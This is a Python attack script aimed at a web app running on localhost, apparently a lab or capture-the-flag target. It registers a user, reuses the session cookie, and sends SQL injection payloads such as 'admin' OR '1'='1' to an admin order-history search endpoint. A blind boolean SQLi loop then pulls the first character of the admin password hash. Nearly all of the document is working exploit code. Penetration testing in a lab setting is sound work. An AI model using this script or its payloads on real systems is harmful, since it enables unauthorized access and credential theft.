#!/usr/bin/env python3
import requests
import string

# Configuration
BASE_URL = "http://localhost:53191"
TARGET_URL = f"{BASE_URL}/admin/search_order_history"

# Step 1: Register a test user
print("[*] Registering test user...")
register_data = {
    "username": "testuser123",
    "password": "testpass123"
}
r = requests.post(f"{BASE_URL}/register", data=register_data, allow_redirects=False)
if "Set-Cookie" in r.headers:
    cookie = r.headers["Set-Cookie"].split("token=")[1].split(";")[0]
    print(f"[+] Registered and got cookie: {cookie[:20]}...")
else:
    print("[-] Failed to register")
    exit(1)

cookies = {"token": cookie}

# Step 2: Test basic SQL injection
print("\n[*] Testing basic SQL injection...")
test_payloads = [
    "admin' OR '1'='1",
    "admin' AND '1'='1",
    "admin' AND '1'='2"
]

for payload in test_payloads:
    params = {
        "category": "username",
        "search_text": payload
    }
    r = requests.get(TARGET_URL, params=params, cookies=cookies)
    print(f"Payload: {payload[:30]:30} | Status: {r.status_code} | Length: {len(r.text)}")

# Step 3: Test blind SQL injection for password extraction
print("\n[*] Testing blind SQLi for password extraction...")
print("[*] Trying to extract first character of admin password...")

charset = string.hexdigits[:16]  # 0-9a-f for hex
found_char = None

for char in charset:
    # Test if first character of password is this char
    payload = f"admin' AND SUBSTR(password,1,1)='{char}"
    params = {
        "category": "username",
        "search_text": payload
    }
    r = requests.get(TARGET_URL, params=params, cookies=cookies)
    
    # Check if we got results (indicating true condition)
    if "admin" in r.text.lower() or len(r.text) > 5000:
        found_char = char
        print(f"[+] Found first character: {char}")
        break
    else:
        print(f"[-] Testing '{char}': No match")

if found_char:
    print(f"\n[+] First character of admin password is: {found_char}")
else:
    print("\n[-] Could not find first character - SQL injection may not be working")

print("\n[*] Test complete!")
